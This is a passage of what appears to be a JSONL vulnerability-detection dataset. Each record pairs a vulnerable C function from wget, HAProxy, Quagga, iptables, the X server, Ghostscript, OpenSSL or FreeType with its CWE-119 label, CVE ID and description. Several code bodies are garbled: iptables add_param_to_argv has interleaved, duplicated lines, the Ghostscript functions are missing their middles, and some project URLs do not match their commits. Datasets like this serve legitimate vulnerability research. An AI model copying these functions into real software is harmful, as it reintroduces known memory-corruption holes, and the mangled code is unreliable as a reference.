rdsize = MIN (remaining_chunk_size, dlbufsize);\n        }\n      else\n        rdsize = exact ? MIN (toread - sum_read, dlbufsize) : dlbufsize;\n\n      if (progress_interactive)\n        {\n          /* For interactive progress gauges, always specify a ~1s\n             timeout, so that the gauge can be updated regularly even\n             when the data arrives very slowly or stalls.  */\n          tmout = 0.95;\n          if (opt.read_timeout)\n            {\n              double waittm;\n              waittm = ptimer_read (timer) - last_successful_read_tm;\n              if (waittm + tmout > opt.read_timeout)\n                {\n                  /* Don't let total idle time exceed read timeout. */\n                  tmout = opt.read_timeout - waittm;\n                  if (tmout < 0)\n                    {\n                      /* We've already exceeded the timeout. */\n                      ret = -1, errno = ETIMEDOUT;\n                      break;\n                    }\n                }\n            }\n        }\n      ret = fd_read (fd, dlbuf, rdsize, tmout);\n\n      if (progress_interactive && ret < 0 && errno == ETIMEDOUT)\n        ret = 0;                /* interactive timeout, handled above */\n      else if (ret <= 0)\n        break;                  /* EOF or read error */\n\n      if (progress || opt.limit_rate || elapsed)\n        {\n          ptimer_measure (timer);\n          if (ret > 0)\n            last_successful_read_tm = ptimer_read (timer);\n        }\n\n      if (ret > 0)\n        {\n          int write_res;\n\n          sum_read += ret;\n\n#ifdef HAVE_LIBZ\n          if (gzbuf != NULL)\n            {\n              int err;\n              int towrite;\n              gzstream.avail_in = ret;\n              gzstream.next_in = (unsigned char *) dlbuf;\n\n              do\n                {\n                  gzstream.avail_out = gzbufsize;\n                  gzstream.next_out = (unsigned char *) gzbuf;\n\n                  err = inflate (&gzstream, Z_NO_FLUSH);\n\n                  switch (err)\n                    {\n                    case Z_MEM_ERROR:\n                      errno = ENOMEM;\n                      ret = -1;\n                      goto out;\n                    case Z_NEED_DICT:\n                    case Z_DATA_ERROR:\n                      errno = EINVAL;\n                      ret = -1;\n                      goto out;\n                    case Z_STREAM_END:\n                      if (exact && sum_read != toread)\n                        {\n                          DEBUGP((\"zlib stream ended unexpectedly after \"\n                                  \"%ld/%ld bytes\\n\", sum_read, toread));\n                        }\n                    }\n\n                  towrite = gzbufsize - gzstream.avail_out;\n                  write_res = write_data (out, out2, gzbuf, towrite, &skip,\n                                          &sum_written);\n                  if (write_res < 0)\n                    {\n                      ret = (write_res == -3) ? -3 : -2;\n                      goto out;\n                    }\n                }\n              while (gzstream.avail_out == 0);\n            }\n          else\n#endif\n            {\n              write_res = write_data (out, out2, dlbuf, ret, &skip,\n                                      &sum_written);\n              if (write_res < 0)\n                {\n                  ret = (write_res == -3) ? -3 : -2;\n                  goto out;\n                }\n            }\n\n          if (chunked)\n            {\n              remaining_chunk_size -= ret;\n              if (remaining_chunk_size == 0)\n                {\n                  char *line = fd_read_line (fd);\n                  if (line == NULL)\n                    {\n                      ret = -1;\n                      break;\n                    }\n                  else\n                    {\n                      if (out2 != NULL)\n                        fwrite (line, 1, strlen (line), out2);\n                      xfree (line);\n                    }\n                }\n            }\n        }\n\n      if (opt.limit_rate)\n        limit_bandwidth (ret, timer);\n\n      if (progress)\n        progress_update (progress, ret, ptimer_read (timer));\n#ifdef WINDOWS\n      if (toread > 0 && opt.show_progress)\n        ws_percenttitle (100.0 *\n                         (startpos + sum_read) / (startpos + toread));\n#endif\n    }\n", "func_hash": 323589515235597079129994725046166819711, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-13090", "cve_desc": "The retr.c:fd_read_body() function is called when processing OK responses. When the response is sent chunked in wget before 1.19.2, the chunk parser uses strtol() to read each chunk's length, but doesn't check that the chunk length is a non-negative number. The code then tries to read the chunk in pieces of 8192 bytes by using the MIN() macro, but ends up passing the negative chunk length to retr.c:fd_read(). As fd_read() takes an int argument, the high 32 bits of the chunk length are discarded, leaving fd_read() with a completely attacker controlled length argument. The attacker can corrupt malloc metadata after the allocated buffer.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-13090"}
{"idx": 106, "project": "haproxy", "commit_id": "7ec765568883b2d4e5a2796adbeb492a22ec9bd4", "project_url": "https://github.com/haproxy/haproxy", "commit_url": "https://git.haproxy.org/?p=haproxy-1.5.git;a=commit;h=7ec765568883b2d4e5a2796adbeb492a22ec9bd4", "commit_message": "None", "target": 1, "func": " void buffer_slow_realign(struct buffer *buf)\n {\n       /* two possible cases :\n        *   - the buffer is in one contiguous block, we move it in-place\n        *   - the buffer is in two blocks, we move it via the swap_buffer\n        */\n       if (buf->i) {\n               int block1 = buf->i;\n               int block2 = 0;\n               if (buf->p + buf->i > buf->data + buf->size) {\n                       /* non-contiguous block */\n                       block1 = buf->data + buf->size - buf->p;\n                       block2 = buf->p + buf->i - (buf->data + buf->size);\n               }\n               if (block2)\n                       memcpy(swap_buffer, buf->data, block2);\n               memmove(buf->data, buf->p, block1);\n               if (block2)\n                       memcpy(buf->data + block1, swap_buffer, block2);\n        }\n \n        buf->p = buf->data;\n }\n", "func_hash": 110551955760274715015247345529003415581, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2015-3281", "cve_desc": "The buffer_slow_realign function in HAProxy 1.5.x before 1.5.14 and 1.6-dev does not properly realign a buffer that is used for pending outgoing data, which allows remote attackers to obtain sensitive information (uninitialized memory contents of previous requests) via a crafted request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3281"}
{"idx": 107, "project": "savannah", "commit_id": "3f872fe60463a931c5c766dbf8c36870c0023e88", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/gitweb/?p=quagga.git;a=commitdiff;h=3f872fe60463a931c5c766dbf8c36870c0023e88", "commit_message": "None", "target": 1, "func": "new_msg_register_event (u_int32_t seqnum, struct lsa_filter_type *filter)\n{\n  u_char buf[OSPF_API_MAX_MSG_SIZE];\n  struct msg_register_event *emsg;\n  int len;\n\n  emsg = (struct msg_register_event *) buf;\n  len = sizeof (struct msg_register_event) +\n    filter->num_areas * sizeof (struct in_addr);\n   emsg->filter.typemask = htons (filter->typemask);\n   emsg->filter.origin = filter->origin;\n   emsg->filter.num_areas = filter->num_areas;\n   return msg_new (MSG_REGISTER_EVENT, emsg, seqnum, len);\n }\n", "func_hash": 24569741928780254928487121835647969548, "file_name": "ospf_api.c", "file_hash": 292116959237005994810997282250604698459, "cwe": ["CWE-119"], "cve": "CVE-2013-2236", "cve_desc": "Stack-based buffer overflow in the new_msg_lsa_change_notify function in the OSPFD API (ospf_api.c) in Quagga before 0.99.22.2, when --enable-opaque-lsa and the -a command line option are used, allows remote attackers to cause a denial of service (crash) via a large LSA.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2236"}
{"idx": 123, "project": "netfilter", "commit_id": "2ae1099a42e6a0f06de305ca13a842ac83d4683e", "project_url": "https://git.netfilter.org/conntrack-tools", "commit_url": "https://git.netfilter.org/iptables/commit/iptables/xshared.c?id=2ae1099a42e6a0f06de305ca13a842ac83d4683e", "commit_message": "None", "target": 1, "func": " void add_param_to_argv(char *parsestart, int line)\n {\n\tint quote_open = 0, escaped = 0, param_len = 0;\n\tchar param_buffer[1024], *curchar;\n \n \t/* After fighting with strtok enough, here's now\n \t * a 'real' parser. According to Rusty I'm now no\n\t\t\t} else {\n\t\t\t\tparam_buffer[param_len++] = *curchar;\n \tfor (curchar = parsestart; *curchar; curchar++) {\n \t\tif (quote_open) {\n \t\t\tif (escaped) {\n\t\t\t\tparam_buffer[param_len++] = *curchar;\n \t\t\t\tescaped = 0;\n \t\t\t\tcontinue;\n \t\t\t} else if (*curchar == '\\\\') {\n\t\t}\n\n\t\tswitch (*curchar) {\n \t\t\t\tquote_open = 0;\n \t\t\t\t*curchar = '\"';\n \t\t\t} else {\n\t\t\t\tparam_buffer[param_len++] = *curchar;\n \t\t\t\tcontinue;\n \t\t\t}\n \t\t} else {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\t/* regular character, copy to buffer */\n\t\t\tparam_buffer[param_len++] = *curchar;\n\n\t\t\tif (param_len >= sizeof(param_buffer))\n\t\t\t\txtables_error(PARAMETER_PROBLEM,\n \t\tcase ' ':\n \t\tcase '\\t':\n \t\tcase '\\n':\n\t\t\tif (!param_len) {\n \t\t\t\t/* two spaces? */\n \t\t\t\tcontinue;\n \t\t\t}\n \t\t\tbreak;\n \t\tdefault:\n \t\t\t/* regular character, copy to buffer */\n\t\t\tparam_buffer[param_len++] = *curchar;\n\t\t\tif (param_len >= sizeof(param_buffer))\n\t\t\t\txtables_error(PARAMETER_PROBLEM,\n\t\t\t\t\t      \"Parameter too long!\");\n \t\t\tcontinue;\n \t\t}\n \n\t\tparam_buffer[param_len] = '\\0';\n \n \t\t/* check if table name specified */\n\t\tif ((param_buffer[0] == '-' &&\n\t\t     param_buffer[1] != '-' &&\n\t\t     strchr(param_buffer, 't')) ||\n\t\t    (!strncmp(param_buffer, \"--t\", 3) &&\n\t\t     !strncmp(param_buffer, \"--table\", strlen(param_buffer)))) {\n \t\t\txtables_error(PARAMETER_PROBLEM,\n \t\t\t\t      \"The -t option (seen in line %u) cannot be used in %s.\\n\",\n \t\t\t\t      line, xt_params->program_name);\n \t\t}\n \n\t\tadd_argv(param_buffer, 0);\n\t\tparam_len = 0;\n \t}\n", "func_hash": 204920135878748692275786929565292679269, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2019-11360", "cve_desc": "A buffer overflow in iptables-restore in netfilter iptables 1.8.2 allows an attacker to (at least) crash the program or potentially gain code execution via a specially crafted iptables-save file. This is related to add_param_to_argv in xshared.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11360"}
{"idx": 128, "project": "xserver", "commit_id": "215f894965df5fb0bb45b107d84524e700d2073c", "project_url": "http://gitweb.freedesktop.org/?p=xorg/xserver", "commit_url": "https://cgit.freedesktop.org/xorg/xserver/commit/?id=215f894965df5fb0bb45b107d84524e700d2073c", "commit_message": "dix: Disallow GenericEvent in SendEvent request.\n\nThe SendEvent request holds xEvent which is exactly 32 bytes long, no more,\nno less. Both ProcSendEvent and SProcSendEvent verify that the received data\nexactly match the request size. However nothing stops the client from passing\nin event with xEvent::type = GenericEvent and any value of\nxGenericEvent::length.\n\nIn the case of ProcSendEvent, the event will be eventually passed to\nWriteEventsToClient which will see that it is Generic event and copy the\narbitrary length from the receive buffer (and possibly past it) and send it to\nthe other client. This allows clients to copy unitialized heap memory out of X\nserver or to crash it.\n\nIn case of SProcSendEvent, it will attempt to swap the incoming event by\ncalling a swapping function from the EventSwapVector array. The swapped event\nis written to target buffer, which in this case is local xEvent variable. The\nxEvent variable is 32 bytes long, but the swapping functions for GenericEvents\nexpect that the target buffer has size matching the size of the source\nGenericEvent. This allows clients to cause stack buffer overflows.\n\nSigned-off-by: Michal Srb <msrb@suse.com>\nReviewed-by: Peter Hutterer <peter.hutterer@who-t.net>\nSigned-off-by: Peter Hutterer <peter.hutterer@who-t.net>", "target": 1, "func": "ProcSendEvent(ClientPtr client)\n{\n    WindowPtr pWin;\n    WindowPtr effectiveFocus = NullWindow;      /* only set if dest==InputFocus */\n    DeviceIntPtr dev = PickPointer(client);\n    DeviceIntPtr keybd = GetMaster(dev, MASTER_KEYBOARD);\n    SpritePtr pSprite = dev->spriteInfo->sprite;\n\n    REQUEST(xSendEventReq);\n\n    REQUEST_SIZE_MATCH(xSendEventReq);\n\n    /* libXext and other extension libraries may set the bit indicating\n     * that this event came from a SendEvent request so remove it\n     * since otherwise the event type may fail the range checks\n     * and cause an invalid BadValue error to be returned.\n     *\n     * This is safe to do since we later add the SendEvent bit (0x80)\n     * back in once we send the event to the client */\n\n    stuff->event.u.u.type &= ~(SEND_EVENT_BIT);\n\n    /* The client's event type must be a core event type or one defined by an\n       extension. */\n\n    if (!((stuff->event.u.u.type > X_Reply &&\n           stuff->event.u.u.type < LASTEvent) ||\n          (stuff->event.u.u.type >= EXTENSION_EVENT_BASE &&\n           stuff->event.u.u.type < (unsigned) lastEvent))) {\n         client->errorValue = stuff->event.u.u.type;\n         return BadValue;\n     }\n     if (stuff->event.u.u.type == ClientMessage &&\n         stuff->event.u.u.detail != 8 &&\n         stuff->event.u.u.detail != 16 && stuff->event.u.u.detail != 32) {\n    }\n\n    if (stuff->destination == PointerWindow)\n        pWin = pSprite->win;\n    else if (stuff->destination == InputFocus) {\n        WindowPtr inputFocus = (keybd) ? keybd->focus->win : NoneWin;\n\n        if (inputFocus == NoneWin)\n            return Success;\n\n        /* If the input focus is PointerRootWin, send the event to where\n           the pointer is if possible, then perhaps propogate up to root. */\n        if (inputFocus == PointerRootWin)\n            inputFocus = GetCurrentRootWindow(dev);\n\n        if (IsParent(inputFocus, pSprite->win)) {\n            effectiveFocus = inputFocus;\n            pWin = pSprite->win;\n        }\n        else\n            effectiveFocus = pWin = inputFocus;\n    }\n    else\n        dixLookupWindow(&pWin, stuff->destination, client, DixSendAccess);\n\n    if (!pWin)\n        return BadWindow;\n    if ((stuff->propagate != xFalse) && (stuff->propagate != xTrue)) {\n        client->errorValue = stuff->propagate;\n        return BadValue;\n    }\n    stuff->event.u.u.type |= SEND_EVENT_BIT;\n    if (stuff->propagate) {\n        for (; pWin; pWin = pWin->parent) {\n            if (XaceHook(XACE_SEND_ACCESS, client, NULL, pWin,\n                         &stuff->event, 1))\n                return Success;\n            if (DeliverEventsToWindow(dev, pWin,\n                                      &stuff->event, 1, stuff->eventMask,\n                                      NullGrab))\n                return Success;\n            if (pWin == effectiveFocus)\n                return Success;\n            stuff->eventMask &= ~wDontPropagateMask(pWin);\n            if (!stuff->eventMask)\n                break;\n        }\n    }\n    else if (!XaceHook(XACE_SEND_ACCESS, client, NULL, pWin, &stuff->event, 1))\n        DeliverEventsToWindow(dev, pWin, &stuff->event,\n                              1, stuff->eventMask, NullGrab);\n    return Success;\n}\n", "func_hash": 36683317052216501366087070681901031177, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-10971", "cve_desc": "In the X.Org X server before 2017-06-19, a user authenticated to an X Session could crash or execute code in the context of the X Server by exploiting a stack overflow in the endianness conversion of X Events.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-10971"}
{"idx": 129, "project": "xserver", "commit_id": "8caed4df36b1f802b4992edcfd282cbeeec35d9d", "project_url": "http://gitweb.freedesktop.org/?p=xorg/xserver", "commit_url": "https://cgit.freedesktop.org/xorg/xserver/commit/?id=8caed4df36b1f802b4992edcfd282cbeeec35d9d", "commit_message": "Xi: Verify all events in ProcXSendExtensionEvent.\n\nThe requirement is that events have type in range\nEXTENSION_EVENT_BASE..lastEvent, but it was tested\nonly for first event of all.\n\nSigned-off-by: Michal Srb <msrb@suse.com>\nReviewed-by: Peter Hutterer <peter.hutterer@who-t.net>\nSigned-off-by: Peter Hutterer <peter.hutterer@who-t.net>", "target": 1, "func": " ProcXSendExtensionEvent(ClientPtr client)\n {\n    int ret;\n     DeviceIntPtr dev;\n     xEvent *first;\n     XEventClass *list;\n    struct tmask tmp[EMASKSIZE];\n\n    REQUEST(xSendExtensionEventReq);\n    REQUEST_AT_LEAST_SIZE(xSendExtensionEventReq);\n\n    if (stuff->length !=\n        bytes_to_int32(sizeof(xSendExtensionEventReq)) + stuff->count +\n        (stuff->num_events * bytes_to_int32(sizeof(xEvent))))\n        return BadLength;\n\n    ret = dixLookupDevice(&dev, stuff->deviceid, client, DixWriteAccess);\n    if (ret != Success)\n        return ret;\n\n    if (stuff->num_events == 0)\n        return ret;\n\n     /* The client's event type must be one defined by an extension. */\n \n     first = ((xEvent *) &stuff[1]);\n    if (!((EXTENSION_EVENT_BASE <= first->u.u.type) &&\n          (first->u.u.type < lastEvent))) {\n        client->errorValue = first->u.u.type;\n        return BadValue;\n     }\n \n     list = (XEventClass *) (first + stuff->num_events);\n        return ret;\n\n    ret = (SendEvent(client, dev, stuff->destination,\n                     stuff->propagate, (xEvent *) &stuff[1],\n                     tmp[stuff->deviceid].mask, stuff->num_events));\n\n    return ret;\n}\n", "func_hash": 288772859654498582457761658216356600870, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-10971", "cve_desc": "In the X.Org X server before 2017-06-19, a user authenticated to an X Session could crash or execute code in the context of the X Server by exploiting a stack overflow in the endianness conversion of X Events.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-10971"}
{"idx": 139, "project": "ghostscript", "commit_id": "c53183d4e7103e87368b7cfa15367a47d559e323", "project_url": "http://git.ghostscript.com/?p=mupdf", "commit_url": "http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=c53183d4e7103e87368b7cfa15367a47d559e323", "commit_message": "None", "target": 1, "func": "xps_true_callback_glyph_name(gs_font *pfont, gs_glyph glyph, gs_const_string *pstr)\n{\n    /* This function is copied verbatim from plfont.c */\n\n    int table_length;\n     int table_offset;\n \n     ulong format;\n    uint numGlyphs;\n     uint glyph_name_index;\n     const byte *postp; /* post table pointer */\n \n     /* guess if the font type is not truetype */\n     if ( pfont->FontType != ft_TrueType )\n     {\n            pstr->size = strlen((char*)pstr->data);\n            return 0;\n        }\n        else\n        {\n            return gs_throw1(-1, \"glyph index %lu out of range\", (ulong)glyph);\n        }\n    }\n", "func_hash": 83736377691001723428427436308560857107, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-9619", "cve_desc": "The xps_true_callback_glyph_name function in xps/xpsttf.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (Segmentation Violation and application crash) via a crafted file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-9619"}
{"idx": 140, "project": "ghostscript", "commit_id": "3c2aebbedd37fab054e80f2e315de07d7e9b5bdb", "project_url": "http://git.ghostscript.com/?p=mupdf", "commit_url": "http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=3c2aebbedd37fab054e80f2e315de07d7e9b5bdb", "commit_message": "None", "target": 1, "func": "xps_load_sfnt_name(xps_font_t *font, char *namep)\n {\n     byte *namedata;\n     int offset, length;\n    /*int format;*/\n    int count, stringoffset;\n    int found;\n    int i, k;\n\n    found = 0;\n    strcpy(namep, \"Unknown\");\n\n    offset = xps_find_sfnt_table(font, \"name\", &length);\n    if (offset < 0 || length < 6)\n    {\n        gs_warn(\"cannot find name table\");\n        return;\n    }\n\n    /* validate the offset, and the data for the two\n     * values we're about to read\n     */\n    if (offset + 6 > font->length)\n    {\n        gs_warn(\"name table byte offset invalid\");\n        return;\n    }\n    namedata = font->data + offset;\n\n    /*format = u16(namedata + 0);*/\n    count = u16(namedata + 2);\n    stringoffset = u16(namedata + 4);\n\n    if (stringoffset + offset > font->length\n        || offset + 6 + count * 12 > font->length)\n    {\n        gs_warn(\"name table invalid\");\n        return;\n    }\n\n    if (length < 6 + (count * 12))\n    {\n        gs_warn(\"name table too short\");\n        return;\n    }\n\n    for (i = 0; i < count; i++)\n    {\n        byte *record = namedata + 6 + i * 12;\n        int pid = u16(record + 0);\n        int eid = u16(record + 2);\n        int langid = u16(record + 4);\n        int nameid = u16(record + 6);\n         length = u16(record + 8);\n         offset = u16(record + 10);\n \n         /* Full font name or postscript name */\n         if (nameid == 4 || nameid == 6)\n         {\n                if (found < 3)\n                {\n                    memcpy(namep, namedata + stringoffset + offset, length);\n                    namep[length] = 0;\n                    found = 3;\n                }\n            }\n\n            if (pid == 3 && eid == 1 && langid == 0x409) /* windows unicode ucs-2, US */\n            {\n                if (found < 2)\n                {\n                    unsigned char *s = namedata + stringoffset + offset;\n                    int n = length / 2;\n                    for (k = 0; k < n; k ++)\n                    {\n                        int c = u16(s + k * 2);\n                        namep[k] = isprint(c) ? c : '?';\n                    }\n                    namep[k] = 0;\n                    found = 2;\n                }\n            }\n\n            if (pid == 3 && eid == 10 && langid == 0x409) /* windows unicode ucs-4, US */\n            {\n                if (found < 1)\n                {\n                    unsigned char *s = namedata + stringoffset + offset;\n                    int n = length / 4;\n                    for (k = 0; k < n; k ++)\n                    {\n                        int c = u32(s + k * 4);\n                        namep[k] = isprint(c) ? c : '?';\n                    }\n                    namep[k] = 0;\n                    found = 1;\n                }\n            }\n        }\n    }\n", "func_hash": 112369513254285676016910036571983121831, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-9618", "cve_desc": "The xps_load_sfnt_name function in xps/xpsfont.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (buffer overflow and application crash) or possibly have unspecified other impact via a crafted document.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-9618"}
{"idx": 150, "project": "openssl", "commit_id": "d0666f289ac013094bbbf547bfbcd616199b7d2d", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commit;h=d0666f289ac013094bbbf547bfbcd616199b7d2d", "commit_message": "evp: prevent underflow in base64 decoding\n\nThis patch resolves RT ticket #2608.\n\nThanks to Robert Dugal for originally spotting this, and to David\nRamos for noticing that the ball had been dropped.\n\nSigned-off-by: Geoff Thorpe <geoff@openssl.org>", "target": 1, "func": "int EVP_DecodeUpdate(EVP_ENCODE_CTX *ctx, unsigned char *out, int *outl,\n\t     const unsigned char *in, int inl)\n\t{\n\tint seof= -1,eof=0,rv= -1,ret=0,i,v,tmp,n,ln,exp_nl;\n\tunsigned char *d;\n\n\tn=ctx->num;\n\td=ctx->enc_data;\n\tln=ctx->line_num;\n\texp_nl=ctx->expect_nl;\n\n\t/* last line of input. */\n\tif ((inl == 0) || ((n == 0) && (conv_ascii2bin(in[0]) == B64_EOF)))\n\t\t{ rv=0; goto end; }\n\t\t\n\t/* We parse the input data */\n\tfor (i=0; i<inl; i++)\n\t\t{\n\t\t/* If the current line is > 80 characters, scream alot */\n\t\tif (ln >= 80) { rv= -1; goto end; }\n\n\t\t/* Get char and put it into the buffer */\n\t\ttmp= *(in++);\n\t\tv=conv_ascii2bin(tmp);\n\t\t/* only save the good data :-) */\n\t\tif (!B64_NOT_BASE64(v))\n\t\t\t{\n\t\t\tOPENSSL_assert(n < (int)sizeof(ctx->enc_data));\n\t\t\td[n++]=tmp;\n\t\t\tln++;\n\t\t\t}\n\t\telse if (v == B64_ERROR)\n\t\t\t{\n\t\t\trv= -1;\n\t\t\tgoto end;\n\t\t\t}\n\n\t\t/* have we seen a '=' which is 'definitly' the last\n\t\t * input line.  seof will point to the character that\n\t\t * holds it. and eof will hold how many characters to\n\t\t * chop off. */\n\t\tif (tmp == '=')\n\t\t\t{\n\t\t\tif (seof == -1) seof=n;\n\t\t\teof++;\n\t\t\t}\n\n\t\tif (v == B64_CR)\n\t\t\t{\n\t\t\tln = 0;\n\t\t\tif (exp_nl)\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t/* eoln */\n\t\tif (v == B64_EOLN)\n\t\t\t{\n\t\t\tln=0;\n\t\t\tif (exp_nl)\n\t\t\t\t{\n\t\t\t\texp_nl=0;\n\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t}\n\t\texp_nl=0;\n\n\t\t/* If we are at the end of input and it looks like a\n\t\t * line, process it. */\n\t\tif (((i+1) == inl) && (((n&3) == 0) || eof))\n\t\t\t{\n\t\t\tv=B64_EOF;\n\t\t\t/* In case things were given us in really small\n\t\t\t   records (so two '=' were given in separate\n\t\t\t   updates), eof may contain the incorrect number\n\t\t\t   of ending bytes to skip, so let's redo the count */\n\t\t\teof = 0;\n\t\t\tif (d[n-1] == '=') eof++;\n\t\t\tif (d[n-2] == '=') eof++;\n\t\t\t/* There will never be more than two '=' */\n\t\t\t}\n\n\t\tif ((v == B64_EOF && (n&3) == 0) || (n >= 64))\n\t\t\t{\n\t\t\t/* This is needed to work correctly on 64 byte input\n\t\t\t * lines.  We process the line and then need to\n\t\t\t * accept the '\\n' */\n\t\t\tif ((v != B64_EOF) && (n >= 64)) exp_nl=1;\n\t\t\tif (n > 0)\n\t\t\t\t{\n                                v=EVP_DecodeBlock(out,d,n);\n                                n=0;\n                                if (v < 0) { rv=0; goto end; }\n                                ret+=(v-eof);\n                                }\n                        else\n\t\t\t\teof=1;\n\t\t\t\tv=0;\n\t\t\t\t}\n\n\t\t\t/* This is the case where we have had a short\n\t\t\t * but valid input line */\n\t\t\tif ((v < ctx->length) && eof)\n\t\t\t\t{\n\t\t\t\trv=0;\n\t\t\t\tgoto end;\n\t\t\t\t}\n\t\t\telse\n\t\t\t\tctx->length=v;\n\n\t\t\tif (seof >= 0) { rv=0; goto end; }\n\t\t\tout+=v;\n\t\t\t}\n\t\t}\n", "func_hash": 314448950255259267086706912584575387344, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2015-0292", "cve_desc": "Integer underflow in the EVP_DecodeUpdate function in crypto/evp/encode.c in the base64-decoding implementation in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via crafted base64 data that triggers a buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-0292"}
{"idx": 165, "project": "savannah", "commit_id": "7f2e4f4f553f6836be7683f66226afac3fa979b8", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7f2e4f4f553f6836be7683f66226afac3fa979b8", "commit_message": "None", "target": 1, "func": "  _bdf_parse_glyphs( char*          line,\n                     unsigned long  linelen,\n                     unsigned long  lineno,\n                     void*          call_data,\n                     void*          client_data )\n  {\n    int                c, mask_index;\n    char*              s;\n    unsigned char*     bp;\n    unsigned long      i, slen, nibbles;\n\n    _bdf_parse_t*      p;\n    bdf_glyph_t*       glyph;\n    bdf_font_t*        font;\n\n    FT_Memory          memory;\n    FT_Error           error = BDF_Err_Ok;\n\n    FT_UNUSED( call_data );\n    FT_UNUSED( lineno );        /* only used in debug mode */\n\n\n    p = (_bdf_parse_t *)client_data;\n\n    font   = p->font;\n    memory = font->memory;\n\n    /* Check for a comment. */\n    if ( ft_memcmp( line, \"COMMENT\", 7 ) == 0 )\n    {\n      linelen -= 7;\n\n      s = line + 7;\n      if ( *s != 0 )\n      {\n        s++;\n        linelen--;\n      }\n      error = _bdf_add_comment( p->font, s, linelen );\n      goto Exit;\n    }\n\n    /* The very first thing expected is the number of glyphs. */\n    if ( !( p->flags & _BDF_GLYPHS ) )\n    {\n      if ( ft_memcmp( line, \"CHARS\", 5 ) != 0 )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"CHARS\" ));\n        error = BDF_Err_Missing_Chars_Field;\n        goto Exit;\n      }\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n      p->cnt = font->glyphs_size = _bdf_atoul( p->list.field[1], 0, 10 );\n\n      /* Make sure the number of glyphs is non-zero. */\n      if ( p->cnt == 0 )\n        font->glyphs_size = 64;\n\n      /* Limit ourselves to 1,114,112 glyphs in the font (this is the */\n      /* number of code points available in Unicode).                 */\n      if ( p->cnt >= 0x110000UL )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG5, lineno, \"CHARS\" ));\n        error = BDF_Err_Invalid_Argument;\n        goto Exit;\n      }\n\n      if ( FT_NEW_ARRAY( font->glyphs, font->glyphs_size ) )\n        goto Exit;\n\n      p->flags |= _BDF_GLYPHS;\n\n      goto Exit;\n    }\n\n    /* Check for the ENDFONT field. */\n    if ( ft_memcmp( line, \"ENDFONT\", 7 ) == 0 )\n    {\n      /* Sort the glyphs by encoding. */\n      ft_qsort( (char *)font->glyphs,\n                font->glyphs_used,\n                sizeof ( bdf_glyph_t ),\n                by_encoding );\n\n      p->flags &= ~_BDF_START;\n\n      goto Exit;\n    }\n\n    /* Check for the ENDCHAR field. */\n    if ( ft_memcmp( line, \"ENDCHAR\", 7 ) == 0 )\n    {\n      p->glyph_enc = 0;\n      p->flags    &= ~_BDF_GLYPH_BITS;\n\n      goto Exit;\n    }\n\n    /* Check whether a glyph is being scanned but should be */\n    /* ignored because it is an unencoded glyph.            */\n    if ( ( p->flags & _BDF_GLYPH )     &&\n         p->glyph_enc            == -1 &&\n         p->opts->keep_unencoded == 0  )\n      goto Exit;\n\n    /* Check for the STARTCHAR field. */\n    if ( ft_memcmp( line, \"STARTCHAR\", 9 ) == 0 )\n    {\n      /* Set the character name in the parse info first until the */\n      /* encoding can be checked for an unencoded character.      */\n      FT_FREE( p->glyph_name );\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      _bdf_list_shift( &p->list, 1 );\n\n      s = _bdf_list_join( &p->list, ' ', &slen );\n\n      if ( !s )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG8, lineno, \"STARTCHAR\" ));\n        error = BDF_Err_Invalid_File_Format;\n        goto Exit;\n      }\n\n      if ( FT_NEW_ARRAY( p->glyph_name, slen + 1 ) )\n        goto Exit;\n\n      FT_MEM_COPY( p->glyph_name, s, slen + 1 );\n\n      p->flags |= _BDF_GLYPH;\n\n      FT_TRACE4(( DBGMSG1, lineno, s ));\n\n      goto Exit;\n    }\n\n    /* Check for the ENCODING field. */\n    if ( ft_memcmp( line, \"ENCODING\", 8 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_GLYPH ) )\n      {\n        /* Missing STARTCHAR field. */\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"STARTCHAR\" ));\n        error = BDF_Err_Missing_Startchar_Field;\n        goto Exit;\n      }\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      